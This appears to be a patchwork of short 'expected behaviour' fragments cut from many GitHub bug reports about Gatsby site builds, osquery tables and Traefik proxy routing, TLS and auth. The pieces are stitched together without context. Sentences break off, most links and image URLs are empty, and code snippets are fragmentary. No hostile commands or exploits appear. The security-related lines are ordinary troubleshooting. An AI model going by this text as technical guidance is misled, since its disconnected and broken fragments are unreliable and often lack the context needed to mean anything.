- the second codeblock should have a blank line before the line with the `export` statement.
transpilation should happen.
the site's shadow should properly work
it is expected that the new site starts with no error messages
even though this error message displays, the site loads normally.
the dev browser should display the 404 dev page.
client-only routes should work
no warnings or errors in the browser
### as above, no errors or warnings
### the errors described above
the page should load.
return trimmed excerpt.
everything works as expected.
on localhost, the images would appear in their corresponding folder, this happens on `gatsby develop -h 0.0.0.0` ![image](
i should see a fluid image with a maxheight as specified.
the background color of the h1 text should be white when user navigates directly to [ or when user refreshes the page.
should just work as if flexible content would be at top level
the custom component shouldn't be wrapped in a `p`
**why?** if the custom component's root element is a div (for example, if the component is an image gallery), there will be a `div` inside a `p`, which will cause a semantic error: ```
warning: validatedomnesting(...): <div> cannot appear as a descendant of <p>
it should be able to develop locally with https protocol.
according to the json:api there should be a string with the id for nested menu links on the parent value
<img width="581" alt="screenshot 2019-06-21 at 17 12 08" src=" "> should be the string as follows in this instance:
menu_link_content:8d61eedd-a561-4001-8df3-a439bd2acd65
i would expect that, if you hit something like the `/foobarbax`, it would render the client-side 404 page
this is actually working in local dev
**index page** <img width="936" alt="screen shot 2019-06-20 at 3 18 42 pm" src=" "> **client-side 404 page** <img width="936" alt="screen shot 2019-06-20 at 3 18 46 pm" src=" ">
it should start gatsby
critical and loading="eager" behaves the same way
gatsby should route to the right page.
build should complete successfully
if parent directories do not allow files to be listed, the build should still proceed.
the query should run with no errors thrown, as happens in the same application with another query being used the same way, but does not have unions.
develop should run fine.
local code written in the app's `gatsby-ssr.js` and `gatsby-browser.js` (as well as `gatsby-node.js`) should behave the same as the one written in local plugins.
`react` should not be installed automatically..
`props.location.state` should be populated.
no error is thrown.
both gtm snippets should be placed in the html document in the correct places per [google's instructions]( so that i can verify my site for google search console
this means that the `noscript` snippet must be placed "immediately after the opening `<body>` tag"
google's instructions:
![image](
page should work normally
plugin should work normally and convert string node to file node or throw an error.
gatsby should output a message that a file was deleted, along with the path of the file.
new colourset should render
there should be no warnings.
{ "data": { "allmarkdownremark": { "edges": [ { "node": { "excerpt": "paragraph one sentence one
sentence two

dom nodes should remain more or less steady
![](
<img class="gatsby-resp-image-image" alt="&quot;text&quot;">
gatsby should build the website.
there should be no warning.
when i load my page on a slow network connection, i expect the placeholder image to be displayed until the full image has loaded.
the generated html source code should only contain one single declaration of the class that is being applied to the title components.
site renders fine on first load
they should stay in alignment as seen in the screenshot below.
<img width="308" alt="screenshot 2019-05-24 11 12 47" src=" "> ### possible solution when inspecting i noticed that the containing `h3` had a `margin-left: calc(-2.4rem);` but when at the smallest breakpoint <750px changes to `margin: 0px 0px 0.5em calc(-0.4rem);` which seems to fix the alignment at the breakpoint where the icons are shifting.
gatsby starts normally, with a fully built shopify cache.
0 or at least minimal warnings.
shouldn't be any caption shown
a caught rejection means it's handled, so the process should display:
caught error: failed to process
created node: undefined
and continue.
my assumption is when i remove the <layout> component from the index.js file that the result would remove the reference to layout.css which it does do correctly in `gatsby build` but just no `gatsby develop`
the order of items should remain the same after using a node type mapping.
both containers should independently scroll based on whichever's focused.
not sure about expected result, but previous behaviour was that using
field_that_needs_to_be_sanitized_: "string"
for field definition would ultimately result in actually using un-sanitized field name (probably because resolver was inferred?)
from pr description and blog post i'm getting that there should be no behaviour changes.
an image should still retain it's ability to lazy-load and use it's transition style if it's source has changed due to a viewport resize.
images served from the static folder should be prefixed.
styles.css is applied in print mode only.
gatsby build should pass
the back button should take you back to the first page.

gatsby should build even if the parent theme in node_modules is symlinked.
build should succeed.
both images should render correctly.
the video should play on every latest browser
should either give a warning or just continue
starters validate task should pass
a locally served version of the site should open, which should look like [this](
`gatsby-plugin-netlify-cms` should let you access the admin-page on whatever address specified in the `publicpath` variable.
all image paths should be extended to be graphql files.
the red div should remain.
expected to compile without errors.
browsing to ` `, ` ` or ` ` should serve the above `index.html`.
1) the plugin should create the images.
2) the option should not be present in the final output.
show button to preview custom 404 page.
`success building static html for pages`
ideally, you will see scss source maps are compiled correctly and display correctly in all browsers pointing only to a file with extension.
on every run of `gatsby develop`, no errors should appear.
- gatsby develop
- gatsby-source-shopify sources and transforms nodes
- build completes and is in development mode
expect maxwidth and maxheight to control the max image size made by fluid.
if possible to control for, error should always pipe out of `stderr` and logs should always pipe out of `stdout`
- develop process should run and restart automatically
should exit the program after completing the task
a list should render under the heading **section one**
text style without shadows as pictured in [typography demo](
user should see the admin page with no console errors
the query should successfully complete, and the posts in which image is null in the frontmatter should be filtered out.
hitting the refresh button takes me back to the same scroll position i was
(since i am not in a route i cannot use shouldupdatescroll as it's not going through a route)
no `null` localfiles
it should tolerate `null` and build normally.
it should run.
index page must not be deleted.
the excerpt on the page should say:
> this is my first post on my new fake blog!
the excerpts should be from the beginning of the article and should be pruned according to `prunelength`.
it should pull up the plugin page.
code on the code sandbox should have @material-ui/core correctly attached (`"@material-ui/core": "latest"`)
0 to many search results should be visible.
the page should be like in localhost
<img width="1280" alt="screen shot 2019-03-04 at 11 07 53" src=" ">
all of them load, hmr is ready.
i expect a header like this:
`"authorization":"basic aw5mb0brb25vbasfwefwfsadaweawefweezbtn03rkurvljfzwz0bw=="`
either the correct image, or if that's not possible then remove the image.
all css classes should be included on deployment.
it should render the updated changes without refreshing the page.
see the original page.
build successful
i expect the cached file to be unchanged after building (i.e., not downloaded again)
the request should send the `if-none-match` header, the response should be a 304, and the cached file unchanged
subsequent restarts should continue to use the cached file.
there are two options, either correctly sized favicons should be produced or the build should emit warning or error.
the locally run project should run the same as the production version.
developer should be able to change scroll update behavior by defining `shouldupdatescroll` function when `gatsby-remark-autolink-headers` plugin is included into a project
probably `shouldupdatescroll` function defined in `gatsby-remark-autolink-headers` should return `undefined` instead of true if url does not contain a hash
in this case its result will be ignored and it will be possible to disable scroll update for certain pages.
expected placeholder to be aligned.
show 4 different markdown file contents.
the component should be rendered, and the emotion babel transforms should be applied.
i should see the url change to ` #some-id`
should scroll to where users want to stop.
`headings` should be:
[ { "value": "normal title", "depth": 1 }, { "value": "code title", <-------- "depth": 1 }
running build and serve should result in the same website output as running develop
when expanding the node in a page query, i should get an array of items
meaning, it should work the same as a forward relationship for 1:n.
`./content/blog/hello-world/salty_egg.jpg` and `./public/static/8058f3f26913fea3b6a89a73344fe94a/105fb/salty_egg.jpg` should be identical because the "original image" was requested.
tags are set during build time via react helmet.
"gatsby" in footer for should be black.
* page should load without errors
* there should be 3 blog posts with the content from the /posts/ markdown files
* the 'about' tab should display 3 'cards' each with information from the /bio/ markdown files.
* the blurb should load with information from the 'blurb.md' file
there will be warnings
there are some imports that aren't being used but aside from that everything should be fine.
the graphql schema should include `categories` with this id, or even better, the actual category from the categories collection
should print normally.
hmr should work in ie
query should be injected and data should be available
classes from css modules should be applied
if the characters are not allowed, i'd hope for a warning or error telling me so.
plugin shouldn't change gatsby's build output.
i was expecting the markdown image to blur up
i notice the generated html between `gatsby-image` and `gatsby-remark-images` differs
**`gatsby-image`** ```html

the database name `one-two-three` should be sanitized to `onetwothree` (assuming that was the intention and not onetwothree) and the build shouldn't fail.
for the above code, the expected response is `'b'` based on the content in [cache.js]( #l47): ``` javascript set(key, value, args = {}) { return new promise(resolve => { this.cache.set(key, value, args, (_, res) => resolve(res)) }) }
it should resolve with the response of what was stored
it appears the cache-manager package callback argument suggests a resolve value exists (see: [cache-manager]( #l197))
this is what is used under the hood for cache.set but one level deeper into the 'async' package (see: [async]( #l47)), we see the third argument callback only gets passed an error or nothing, never a second result argument
i think aync.each is like array.foreach where it has no returned array unlike map functions
so my best guess here, is 'cache-manager' promised a result, but under the hood, it's callback is never defining that result since aync.each provides no args or err to that callback hence it bubbles back up to us as `undefined`
the gatsby tests for this only check if the response is thenable, which it does return a promise that just resolves to `undefined`.
when using the option `omitgooglefont: true` and deploying the development site with `gatsby develop` that it should not fetch the fonts from google fonts.
* async code should not overflow into createpagesstatefully lifecycle
* using `deletepage` should not cause other hooks to fail
it shouldn't crash as all the options are optional.
the `graphql` query should be able to fetch the data provided by the `api`
not having any blank page rendering as it is when you disable the serviceworker.
**problem 1:** i expect the page scroll not to jump, at least this was the case with gatsby v1
it worked properly and there was no flashes at all
it shouldn't be the solution to stay on v1
**problem2:** i expect the fonts to be loaded before the content is rendered
is the link tag maybe dynamically (with js) added to the head? the same goes for the styles
i'd love to load the styles before the content is rendered to avoid seeing unstyled content.
either actually convert into a jpg image format, or don't use jpg extension(and probably throw an error/warning instead of failing silently).
i had expected that the page would be marked as dirty and thus removed
in the case of the updated node, i would have expected the new page to work as intended, while the old page would be removed.
it should say something like _(originally published at 416serg.me)_
you should see the detail page of the site that you just visited.
for example: (actually, @fk is this the correct url i should expect for a permalink?)
storybook should compile & serve
page should load, typography css should be injected.
the json should have access to all fields of the entry
so for a link i should have things like the slug and title of the entry its linking to.
the environment variable `api_key` from `.env.staging` should be present in `public/index.html`
404 page is displayed
<kbd><img width="855" alt="screen shot 2018-12-17 at 11 29 01 pm" src=" " border="1"></kbd>
gatsby builds the site and begins serving.
either support gifs or at least throw an error that the format is not supported and retry the rest of the images after the gif
i would expect null for entries which have no images but in this case the thumbnail should still get generated and in the localfile be populated.
rendering hooks are called as usual.
you should be able to navigate.
should show me a list of starters.
the root component should only mount once.
we should see him
the field should support fragments for each content type.
after clicking the `<link to=" "> </link>` it should jump to page ` `.
only env vars starting with `gatsby_` (and maybe others necessary for the build - which ones?) should be included in production bundles, as stated on ### possible solution i would guess that the problem is this line in the `webpack.config.js`: #l70
maybe we could white-list necessary env vars (including those starting with `gatsby_ `) and ignore all others
would love to hear your thoughts on this.
global stylesheet should only be active for the page where the component is rendered.
_carbon-components style_
.bx--btn--primary { ~~background-color: #3d70b2;~~ border-width: 2px; border-style: solid; border-color: transparent; ~~color: #fff;~~
} _styled-components style_
.buytmi { color: blue; background-color: orange;
either not allow the first build and throw error the fix is mandatory or let the other builds to be successful as well.
parentheses in `calc()` functions alter the computation order of calculations.
my expectation is to use the same style of image query like the drupal example, but i didn\'t see "localfile" field
```
relationships { category { name } image { relationships { imagefile { localfile { childimagesharp { fluid(maxwidth: 470, maxheight: 353) { ...gatsbyimagesharpfluid } } } } } } }
i would expect the `<img .../>` component output in recipe.js to display an image.
- when browsing to `/` or `/foo` i would expect to see the index page **_./src/pages/index.js_**
- when browsing to `/sub/` or `/sub/foo` i would expect to see the sub page template **_./src/templates/sub.js_** i'm quite sure that this worked in the past and [this comment]( #issuecomment-425874258) from @pieh makes me believe this is the way the matching is supposed to work.
search placeholder should be visible fully
![gatsbyjs](
no borders in background for images in link tags.
the share button's style should align with the 'view demo' button.
the drop down should close if you click outside the drop down area.
the project should build
it shouldn't matter that the two `staticquery`s are in the same file.
one should see the desired blog post.
the site should build for extra large json objects going through json.stringify()
expected result is `thank you` like sending feedback for a local plugin.
you should now see the cosmicjs starter.
well, gatsby develop command should allow the thing to compile no matter what the file path's name is
when the paths match in the initial condition, we should just `return` and not process the rest of the code.
traced svg should match the image that is to be loaded.
![image](
results for v2 site should not show up when searching on v1 site.
all <p> should have the classname from emotion-js
the line numbers should be aligned with the line they represent
table of contents should be free from any html elements.
i have no idea
what should we do? since the block with the title and the search form are sticky on scroll what should we do? hide the button on mobile? ![screenshot-2018-10-09_23-12-53](
all rows to be unique.
click on `page-2`, the expected behavior is to navigate to `/public/page-2/`.
the browser mirrors the source changes.
should not see a runtime error when using packages that include `mjs` files.
the data prop in the component should be populated with the result of the query
when navigating the web page with a screen reader, every unique image should only be read out once.
it should navigate away from 404 page.
the command should build successfully.
show the development 404 page listing all available routes.
i believe the graphql schema should be identical regardless of the state of `.cache`.
you should be on
redirect to admin.
the app should be accessible in local ip when running `gatsby develop --host=0.0.0.0`
the placeholder should fade out after the main image loads.
the site should compile.
- image is traced into an svg, **or**
- gatsby tells me which error could not be traced
show url without "?no-cache=1"
when you browse to /mypath mypage should display
page content mounts / unmounts as a child of the posegroup, main navigation and footer don't get re-mounted on route changes.
i would expect to see rendered text in the description
clicking links in the dev app should fade in and out between pages.
it should load the page
syntax error in the `gatsby-node.js` file is pointed out.
content change appears in browser
title is set.
the node's content should update with changes to the transformed file.
typography is injected properly into the head when serving static site
the test should test to have an actual excerpt value and the current test should fail
graphql could query on `linked` property
don't know how it works internally, but i hope you can update the router's routes because the graphql data seems to not be sufficient.
see the new page
on `gatsby build`, the css should have an unchanged color value `hsl(-150, 100%, 40%)`, or an equivalent blue hex value `#06c`
(i actually don understand why it compiles to hex; is it for backwards compatibility with old browsers? is this configurable?)
it should navigate to ` ` or ` `.
the pathprefix should be used
the path should be prefixed.
should warn that `styled-jsx-plugin-postcss` is not a valid gatsby plugin.
`pathprefix` is taken into account in every stage of a build proccess.
successful build.
graphql document should be parsed, page should load
the context should be set for the `wraprootelement` and `wrappageelement` apis or if this is intended, there should be a warning in staticquery if no context is available.
production css should still be minified after adding `gatsby-plugin-postcss`.
the site should build
the pages should render consistently between the javascript rendering and static rendering.
url in nav bar updates and the page is shown
build success
the index page should only display "this is home home".
the app should runs without issues
when navigating, the current page should fade out before the next page fades in.
gatsby build is successful
options should be passed through to react-css-modules
gatsby reloads the data, once
you are taken back to the top of the home page
browser should live reload with changes
the work page should render below `<h1>hello</h1>` at the index page.
it should process it as an actual page component
page should be updated without errors
the 404 page should be displayed
create-a-gatsby-site should point to - #-create-a-gatsby-
or update the id of create a gatsby site section -create-a-gatsby-site to create-a-gatsby-site
no blocking redirection
the site should continue to function while offline
location props should be updated on json store component as well (and on children components).
shouldn't start development environment without throwing warning.
when clicking the back button, it'd scroll to the previous scroll position.
successful build:
success building production javascript and css bundles 58.017 s
success building static html for pages 13.414 s 18/18 6.34 pages/second
info done building in 180.627 sec
`quality` should still be honored.
to be redirected to `/bar`
images with links should preserve those links.
the link header should be added to all the routes in the `./public/_headers` file
the source code would have the ga snippet with no mention of the anonymizeip feature.
build should compile as normal with no errors
i expect that the query to return a non-empty result when i run `gatsby build`
gatsby should start the built-in development server
"hello" should render in red as it does when one uses gatsby develop.
should build successfully
google fonts are loaded.
i expected to get the const variable parsed as a normal graphql query getting, then, a rendered page.
build successes
source data should refresh and hot reloading should occur when changes are published in contentful
it should throw an error
the change should appear in the browser on file save (hot module replacement).
gatsby should set the `owner` to the folder name of the plugin.
by not modifying the file, build should process as usual.
react components should hot reload and the changes should be visible in the browser withou having to interact with the page.
site compiles and appears the same as before.
it should not scroll to the top
reload the page content
the string provided as a class name should be used instead of `custom-block`
i would expect an `h1` to be returned with my name in the browser.
works correctly with both named and default exports.
there can be two expected results for this:
- failure to create the page because there were parenthesis in the path.
- success in creating the page
the look website end result in v1 matched what i am seeing in develop in v2 so i would expect that `typography` would be listed in the `<head>` before the inlined css.
to show the page with the translated text.
should behave the same way it does in `development`.
doesn't throw an error.

i would expect the search modal to have a vertical scrollbar or some other way to reduce the overall height of the modal at smaller screen/browser window sizes.
to prevent developer confusion, the visual behavior of a gatsby site should be the same in development and production
the timing of loading and applying css styles affects this consistency
v1 achieved this consistency by always inlining styles.
graphql fragments/queries should be processed, regardless of whether or not the `interface`/`type` has a semicolon.
it should go to the linked page
no promise related errors.
hmr should work normally.
the queried node should be displayed without errors.
it would generate the appropriate index.html file in admin.
no console warning or recommendation from lighthouse
(compared to v1)
`result.data.projects.edges` should contain an array it worked exactly like that in **v1**!
the fragments should be updated automatically.
it should have worked?!
a sample page.
output in console should warn about the "pre-built javascript file" as normal, but after that, show the `localhost:8000` and `localhost:8000/___graphql` links.
after navigation, the new page should be announced
for a working example, visit < activate voiceover, and navigate to the articles page.
component on 404 page should have access to its props.
graphql figures out the node field should be a float
i expect /search to render the search.js page.
news items should be displayed:
![image](
404 page should just render like other pages with no flashing.
the site should build
the native click event needs to be somehow prevented from firing.
the html code is displayed as text within the codeblock.
no validation error since number values are valid json.
center- and right-aligns should work properly.
the source should output custom css properties with a fallback, per #notes
expect to work.
site should be accessible at
![image](
in demo page, images in **resize** part should be rotated.
blog post should be updated according to the new content.
the page should load
adding the new page component makes the browser refresh to show it.
the search results panel should re-open.
i would expect this to work as per this example and this issue: example: #l39
issue:
return a node including `{ field_name: "field value" }`
the dimensions match.

osquery attempts to re-send the block.
carve request id provided by osquery is the name of the scheduled query (or some other appropriate value).

the number of 4624 events in both queries should match
the data column should contain data such as:

i expected it to return no rows.
successful build
<sub>that is actually a lie
i never expect building a project to work the first time
:building_construction:</sub>
'cosine_similarity' column should not be empty
proper value as shown by the equivalent wmi query
i expected for the tables to be available as per: #azure_instance_metadata
lastpass extension listed.
a list of startup items with correct data in "path" & "args" columns
either all the values are ~1 minute behind or all are accounting for the paused time.

i would expect the process to terminate normally regardless of whether or not extensions are registered.
the query should always succeed or if there's an error, it should log it
no errors, expected output from quering the extension's hostblacklist table.
the test not failing
osquery showing up in the appwiz and being able to uninstall it.

`curl google.com`
expected to see all logs (status and results) to show up in "/var/log/osquery" as defined with "--logger_path" we use the \'syslog\' plugin and configure rsyslog to split the status and results logs, sending to /var/log/osqueryd.log and /var/log/osquery.results.log, respectively
both of these files are populated with the data we expect to see, there is no issue with this forwarding.
an understanding of the table with respect to windows
in particular, the documentation suggests that the purpose of the users table _on windows_ is to enumerate _local_ users and that the uuid column is applicable only to macos.
cwd column has the current path of the process (like on linux).

when talking to `kube-apiserver` via traefik, i expected the `kubectl rollout status deploy nginx` command to terminate.
i expected to see an increment in the metric `configreloadsfailurecounter`
in this particular case i'm using datadog so the metric should be `config.reload.total` with the tag `failure: true`.
the request from client will be passed to the service
traefik can request the certificate successfully.
when doing curl to port 80 (traefik endpoint), curl should return iis page
we would have expected that the latency of a putobject / http 1.1 put on traefik has about the same latency as the putobject operation in the minio log (obtained using minio admin trace), plus 1-2 network roundtrips.

traefik to work and reply with error when tried to access such a service

i would have expected that traefik does not fetch all the secrets from the kubernetes api-server, only the ones it needs.
networking/v1beta1 api group for my ingresses
the worker should be displayed in traefik's dashboard and - more importantly - routed to.
i expect to see the dashboard ui
`ingressroute` provider configuration to contain a flag that enables cross-namespace routing behavior (this is a worthwhile feature, imo).
i expected to see traefik starting without issue, and for the commit in the referenced pr to be on the v2.3.0 branch.
`delaybeforecheck > 0` should imply `disablepropagationcheck` as it did before
or they should at least work together.
url resolves correctly.
`p, ok := rw.(http.pusher); ok == true` in #l68
i expected to see a basic-auth "browser prompt" as usual (when only using basic auth)
and a "custom" 401 error page, once a user clicks on "abort" / does not authenticate.
a valid service response.
working instance
i expect to have ability to configure traefik to send a correct request to the authentcation microservice.
expected to have tls-cert in k8s secret get used.
going to *grafana.example.com* should go to my site without any additional tags on the consul service.
no unlimited memory growth/leak
when the business is low, memory can be recycled .
traefik to start and remain working
the file uploads correctly
i do not expect to see an error due to haproxy tcp-checks.
i used `redis-cli -h some.domain.tld -p 6379 -a "password"` on my local machine to test whether i could connect to redis
if i could and query `keys *` and/or `ping` then i assumed it was working
only when hostsni was set to `hostsni(`*`)` and no tls was configured within the file provider was i able to do this successfully.
i stable working connection
#http-to-https-redirection-is-now-configured-on-routers the documentation on migrating from traefik 1.x to 2.x should include valid example configuration files for demonstration purposes.
traefik shouldn't be rate-limiting my local machine as its ip is different from what blazemeter has.
traefik use the metadata to retrieve `access_key`, `secret_access_key` and `token` from metadata.
i think traefik doesn't use the good metadata endpoint, as fargate has a dynamic endpoint.
make a simple docker-compose with : ```yaml version: "3.8"

traefik passes through udp connections to pod
apart from the main website, there are a few other services with other subdomains running that require a tls certificate
for example one called maubot
after running these containers, i do end up infact with a valid and working tls certificate
but not without me noticing the log filling up with some errors.
expected to see 'x-forwarded-method' header in the request
also should 'x-forwarded-uri' be present?
they should both perform similarly
the full regex should be visible
when service timeout, accesslog field `originstatus` should be empty, because service not return anything
cors headers when auth respond negative code(403 for example).
i expected the doc to be correct.
error message since `directory` should really have been `filename`.
persistent http connections from traefik to the backend servers for services remain open after health checks for the service are executed.
i expected traefik to use the acme lego library to make _a single attempt_ to get a tls certificate from the acme server (one order), and then process it to succeed or fail.
i expect to see `traefik_entrypoint_open_connections` and `traefik_service_open_connections` metrics being updated event if traefik is shutting down.
i checked if my routers and services were properly added based on my ingressroutes.
nice clean logs :)
specifying a filter for `x-forwarded-for` should match against `x-forwarded-for`, and other case-mismatched variants.
traefik may reconnect to the redis when connection is closed.
dashboard ui in browser
i expect traefik to be gentle with new orders retry, and retry a new order only after few hours, even more when it gets a 429 error code.
a response with content type `text/plain` not being compressed.
client should receive answer from connected ip address.
- no duplicated datagrams
i expected to see the server application listener silent after the client application finished execution
the expected behavior can be observed by removing traefik from the middle, or reducing the number of concurrent threads and/or introducing a small (250ms) delay between the iterations: [application.conf]( [changed port 80 (traefik) to port 8888 (direct to server)]
akka.discovery.config.services = { greeterservice = { endpoints = [ { host = "127.0.0.1" port = 8888 } ] }
``` [greeterclient.java]( [commented out concurrent clients 2-10; added thread.sleep()]
``` // for 100 concurrent clients future.traverse((1 to 100).tolist) { clientid => // perform 10 requests in a row val r = for { _ <- responsestream(clientid, 1).runforeach(reply => println(s"got streaming reply: ${reply.message}")) //_ <- responsestream(clientid, 2).runforeach(reply => println(s"got streaming reply: ${reply.message}")) //_ <- responsestream(clientid, 3).runforeach(reply => println(s"got streaming reply: ${reply.message}")) //_ <- responsestream(clientid, 4).runforeach(reply => println(s"got streaming reply: ${reply.message}")) //_ <- responsestream(clientid, 5).runforeach(reply => println(s"got streaming reply: ${reply.message}")) //_ <- responsestream(clientid, 6).runforeach(reply => println(s"got streaming reply: ${reply.message}")) //_ <- responsestream(clientid, 7).runforeach(reply => println(s"got streaming reply: ${reply.message}")) //_ <- responsestream(clientid, 8).runforeach(reply => println(s"got streaming reply: ${reply.message}")) //_ <- responsestream(clientid, 9).runforeach(reply => println(s"got streaming reply: ${reply.message}")) //_ <- responsestream(clientid, 10).runforeach(reply => println(s"got streaming reply: ${reply.message}")) } yield {} thread.sleep(250)
``` to recompile these changes you will need to execute: ```
./sbt akka/clean && ./sbt akka/docker:publishlocal
the 301 redirect has the headers.
it should be a correct rule and can match `x-real-ip: 172.18.3.1`.
memory usage shouldn't constantly increase until pod is killed by kubernetes.

requests fall into different buckets for different header values of the header key defined in `sourcecriterion.requestheadername`

windows authentication goes through, even when the backend service is running https
it would be good to have an option to e.g
force http/1.1 between traefik and backend when needed
well, the dashboard.
- traefik can run normally which v1.7.21 can run.
since the ip sending the `x-forwarded-for` header is not trusted, i expected to see the real requester ip (i.e
`5.6.7.8`) in the `clienthost` field.
no warnings.
tls 1.3 enabled on traefik 1.7.22 when we set env "godebug=tls13=1"

the middleware applied to the `ingress`
redirect http to https in all situations, including no or bare "/" path.
correct set `host` in http request object
due to `host` field of `http.request` should be set directly because of `request.write` ignore `host` header:

when traefik dynamically gzips the response, i expect to see an added `vary: accept-encoding` header (or accept-encoding added to an existing vary header).
hot reload create only http entrypoint for the service
i have try "traefik.http.routers.ghost.entrypoints=http, https" or "traefik.http.routers.ghost.entrypoints=https, http" but same behavior.
there is a syntax error in that label
traefik does produce an error identifying the incorrect syntax
i **_do_** expect this could make the service with the label unavailable
i **_do not_** expect this would break other backends
i expected that traefik does not change the x-forwarded-proto from https to wss.
the expected behaviour would have been to reject the ingressroute with invalid syntax, or at least just fail it without any impact on other ingressroute of the cluster.
traefik to come online and complete the let's encrypt challenge/registration.
/entities/projects/some-namespace/some-project --> /entities/projects/some-namespace%2fsome-project
i expect there is a way to configure grpc in backend ssl certificate by using "ingressroute" instead of traefik "dynamic configuration"
as mentioned above, i am trying to do "externalname" approach on the kubernetes service definition
and hopefully, it solves my problem with "backend ca certificate" which should have a reliable cn (common name)
exposing grpc gateway with ssl is very important nowadays in my opinion
and have it well implemented with kubernetes as one of the most used platforms, i believe is pretty essential too
using kubernetes ways is pretty handy for people who used to it compared to dynamic configuration ways
hopefully, there is a better way than this "externalname" approach.
in the kubernetes configuration examples of the v2.0 https & tls: let\'s encrypt ( #configuration-examples ) examples of single domain, multi domain and multi domain tls.domain, i would expect to see consistent use of the "tls:" or a note if different versions were required.
- `curl -vkl ` gets the http router, gets redirected to and shows the page provided by the whoami service
- the traefik dashboard should show two routers with the same rules, two different names, one with tls, and the other without tls
i expected to see traefik not route to the unhealthy service members.
ok status from ping
working jupyter notebook to execute code
mvn deploy works normally
i expected the service metrics to have vectors with `code="429"` as requests have been rate limited.

i was hoping to see ecs provider and the corresponding tasks on the dashboard.

then there's the [`traefik.http.services.myservice.loadbalancer.server.port`]( #port) option which allows you to inform traefik what port to use for a server
_without_ `usebindportip`, it makes sense that the resulting traefik server will simply use the port given in the `server.port` option
the documentation says, > registers a port
useful when the container exposes multiples ports
mandatory for docker swarm (see the section ["port detection with docker swarm"]( #port-detection_1))
, however it is not clear from that how traefik is expected to behave when `usebindportip` is enabled
i would have thought the host port to be used, and the `server.port` option just helping traefik to choose the right one based on the container port that matches the `server.port` option
i realise such a change would maybe be considered breaking as people may have relied on the current behaviour in traefik 2.0+, but on the other hand there is currently no way to help traefik choose the right port when there are multiple
i'm not sure if this is really a bug like #3622 was for pre 2.0.
i expected to have same http status for those scenarios not 500 status code.
the https secured internal websites should use a valid certificate provided by let's encrypt.
i expected the responses to continue to come back as 200's.
new container starts with the same labels, so it goes as a second instance of the same service
first healthcheck on it fails, and traefik does not route requests on it
healthcheck repeats as configured using the `traefik.http.services.service.loadbalancer.healthcheck.interval` label.
once the healthcheck passes, the deployment script stops the old instance.
traefik reconnecting to jaeger agent when it was available again.
i expected to see the stylesheet being returned as text/css, like it does when i navigate to the direct ip of the docker container.
browsing my expectation was to display the website living at
i expected the `x-forwarded-for` header to be set.
relatively quiet logs with level for standard operation with `--log.level=warn`
i expected traefik to warn me about my mistake and to safely ignore the tag.

traefik should not route traffic to backends with critical healthchecks.
traefik will have, at most, a short time when it has no pods to send requests to, which results in 503 responses
after the pod returns to ready traefik sends requests to that pod and no long responds with 503.

as #5374 has been fixed, now dashboard assets can be served under any path prefix, but it continues to fetch api data from `/api`, which seems to be determined at build time or hard coded (?) i would suggest to add something like `--api.pathprefix=/path/prefix` then these endpoints will be served under `/path/prefix/api` and `/path/prefix/dashboard`
which will make them easier to integrate into existing system, for example: - session cookie under some path prefix.
- avoid conflict with existent endpoints.
all the three nodes should be registered.
traefik serves **only one** certificate matching the host of the ingress path **all the time**.

i made an "oops" in my configuration which resulted an endless forwarding cycle (causing traefik to get oom killed)
this was a pretty simple oops, and one i suspect others might make too
it would be nice to have some prevention - perhaps 1) a comment in the docs 2) scan the config for this as one of a small set of "known-bad" patterns and warn the user in logs 3) detect the endless forward and prevent that what happened: 1
i followed the docker quickstart, and was able to get an easy setup working locally
simple system, one container with a webserver on internal port 80
i added `docker.defaultrule=host('foo.com')` and got a working domain setup without having to add any container labels
i enabled the dashboard in insecure mode
visiting foo.com:8080 works as expected, i see the dashboard
unfortunately, visiting foo.com:80 causes traefik to loop until it's oom killed i can see in a debug log that the requests are forwarded to the traefik container instead of the webserver container, which makes sense because they both have the same host rule
as a beginner to the 2.x codebase, this took a while to debug and made learning 2.x feel like a slog
any of the remediations mentioned above would have helped
i originally thought it was my http to https redirection and spent a while learning about middlewares and load balancers before i was able to cut down my config to a much smaller mwe.

it's possible to reference the middleware from the ingressroute with seeing the name with prefix file..

acme to properly generate ssl certificate
i expect the forward auth request to succeed even with traefik's default ssl certificate since auth-tls-insecure is set to true.
cors configuration working
success of the webdav move operation.
stable cpu load
i set tlsoptions.default with minversion = "versiontls12" in my traefik.toml in an kubernetescrd environment and expected traefik only serves protocols newer and equal tls1.2
successful issue of a wildcard certificate
since we are trying to use traefik as a reverse proxy for 12.000 devices we expected it to consume much resources
hence we hoped a rather large aws instance would do the trick
when traefik starts it should load all backends and frontends into the memory
they should be kept up-to-date but the memory usage should stay pretty much constant.

expected behaviour: everything should work as advertised.
my site to be able to get an ssl and have an `https://` address.
i expect to only get 401 and 403 requests in the log.
i expected that the rate limits apply to the webservice when the ratelimit labels are set as deploy labels in the service in docker-compose.yml.
traefik to complete the dns-01 challenge and pull in a new wildcard
i expected to be logged in.
i expected traefik to resolve the client ip address through the x-forwarded-for header passed by the load balancer in front of him
this should route requests prefixed with /subdomain to the backend.
i expect to see timeout parameter in the response and this timeout used in the healthcheck operation.
given my configuration i expected to see the dashboard at `domain/traefik` secured by oauth and other services (a `znc` instance for example), reachable without authorization
also if no rules are given the default rule is:
host:<servicename>.home # maybe this is the name of the compose stack??
traffic should be forwarder to both services with a weight.
200? server timeout? not 500
lately, traefik has started to *sometimes* serve expired certificates (serial number different from the serial of the "normal" certificates)
upgrading to 1.7.8 did not help
when that happens the error persists for some time across client platforms before it vanishes again without admin action.
- without load the memory footprint is around ~30mb
- when some traffic is generated it should not peek as much as it does
on the dashboard i would expect to see the "global-default-backend" to show green and have the backend services.
some behaviour as nginx
we currently run our janusgraph against a nginx as proxy with following config:
upstream upstream_writeable { server janusgraph:8182;
} server { listen 8182 ssl; server_name janusgraph.tld; ssl_certificate /etc/nginx/cert.crt; ssl_certificate_key /etc/nginx/cert.key; location / { proxy_pass proxy_http_version 1.1; }
after i install ingress1 and ingress2, i expect that traefik (v1.6.5) should contain two rules: ```
route rule: pathprefix:/ host: my.domain.com
entry points: 8080
route rule: pathprefix:/ host: my.domain.com
entry points: 9090

traefik should work and communicate with the windows docker engine through the mapped named pipe even in hyperv isolation mode
windows 10 uses hyperv isolation mode by default.

i expected to be able to connect to containers inside the cluster from other namespaces.

cpu usage should be <=10% during file downloads (no matter which tool i am using to download a file).
apache,nginx both takes <=10% during for any file downloads.

i'm expecting to be able to login when browsing either to ` ` or ` `, the following is true for both and i'll refer to them as ` `
when browsing to ` ` for the first time, the response from the forward auth service being `401`, the login form is displayed
when entering a valid password, the form data is send to `auth`, which responds with an authenticating cookie
in presence of the cookie, any access attempt to ` ` should be validated by the forward auth server, and successful.
